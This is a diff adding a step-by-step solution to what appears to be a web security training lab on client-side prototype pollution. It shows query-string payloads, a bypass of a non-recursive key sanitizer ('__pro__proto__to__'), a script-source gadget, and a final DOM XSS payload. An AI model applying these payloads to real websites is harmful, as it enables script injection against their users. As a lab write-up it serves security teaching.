@@ -1,0 +1,66 @@
+Steps to Solve:
+
+1. Test for Prototype Pollution
+
+Try the common prototype pollution payloads:
+/?__proto__.foo=bar
+/?__proto__[foo]=bar
+/?constructor.prototype.foo=bar
+
+Open DevTools → Console and execute:
+Object.prototype
+
+Observe that the foo property is not added.
+
+---
+
+2. Bypass the Key Sanitization
+
+Inspect the JavaScript files.
+
+Notice that deparamSanitized.js sanitizes dangerous keys using sanitizeKey() from searchLoggerFiltered.js.
+
+The filter only sanitizes keys once and does not sanitize recursively.
+
+Bypass the filter using an obfuscated prototype pollution payload:
+/?__pro__proto__to__[foo]=bar
+
+Verify the pollution:
+Object.prototype
+
+The foo property is now added successfully.
+
+---
+
+3. Identify the Gadget
+
+Inspect searchLogger.js.
+
+Notice that if config.transport_url exists, it is assigned to:
+script.src = config.transport_url;
+
+Since transport_url is not defined by default, it can be inherited from Object.prototype.
+
+---
+
+4. Confirm the Gadget
+
+Inject:
+/?__pro__proto__to__[transport_url]=foo
+
+Open DevTools → Elements.
+
+Verify that the application creates:
+<script src="foo"></script>
+
+---
+
+5. Trigger DOM XSS
+
+Replace the payload with:
+/?__pro__proto__to__[transport_url]=data:,alert(1);
+
+The browser loads:
+<script src="data:,alert(1);"></script>
+
+alert(1) is executed and the lab is solved.
